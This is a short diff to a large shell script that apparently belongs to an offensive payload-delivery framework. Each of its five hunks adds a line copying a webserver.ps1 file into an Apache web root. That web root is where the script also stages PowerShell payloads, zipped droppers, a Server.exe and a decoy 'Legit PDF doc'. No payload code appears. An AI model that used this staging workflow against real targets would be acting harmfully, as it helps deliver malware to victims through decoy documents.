@@ -12696,6 +12696,7 @@ echo "${BlueF}[☠]${white} Porting ALL required files to apache2 .."${Reset};sl
 zip $Drop.zip $Drop.$ext > /dev/nul 2>&1
 cp $IPATH/output/$NaM.ps1 $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
 cp $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1
+cp $IPATH/aux/webserver.ps1 $ApAcHe/webserver.ps1 > /dev/nul 2>&1
 cd $IPATH
 
 
@@ -12949,6 +12950,7 @@ zip $Drop.zip $Drop.bat -q
 echo "${BlueF}[☠]${white} Porting ALL required files to apache2 .."${Reset};sleep 2
 cp $IPATH/output/$NaM.ps1 $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
 cp $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1
+cp $IPATH/aux/webserver.ps1 $ApAcHe/webserver.ps1 > /dev/nul 2>&1
 cd $IPATH
 
 
@@ -13261,6 +13263,7 @@ zip $Drop.zip $Drop.$ext.bat > /dev/nul 2>&1
 echo "${BlueF}[☠]${white} Porting ALL required files to apache2 .."${Reset};sleep 2
 cp $IPATH/output/$NaM.ps1 $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
 cp $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1
+cp $IPATH/aux/webserver.ps1 $ApAcHe/webserver.ps1 > /dev/nul 2>&1
 cd $IPATH
 
 
@@ -13799,6 +13802,7 @@ fi
 cp $IPATH/bin/Server.exe $IPATH/output/Server.exe > /dev/nul 2>&1 # Server
 mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # Dropper ziped
 cp $IPATH/output/$Drop.pdf $ApAcHe/$Drop.pdf > /dev/nul 2>&1 # Legit PDF doc
+cp $IPATH/aux/webserver.ps1 $ApAcHe/webserver.ps1 > /dev/nul 2>&1
 cd $IPATH
 
 
@@ -14027,6 +14031,7 @@ zip $Drop.zip $Drop.$Ext > /dev/nul 2>&1
 echo "${BlueF}[☠]${white} Porting ALL required files to apache2"${Reset};sleep 2
 cp $IPATH/output/Client.ps1 $ApAcHe/Client.ps1 > /dev/nul 2>&1
 cp $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1
+cp $IPATH/aux/webserver.ps1 $ApAcHe/webserver.ps1 > /dev/nul 2>&1
 cd $IPATH
 
 
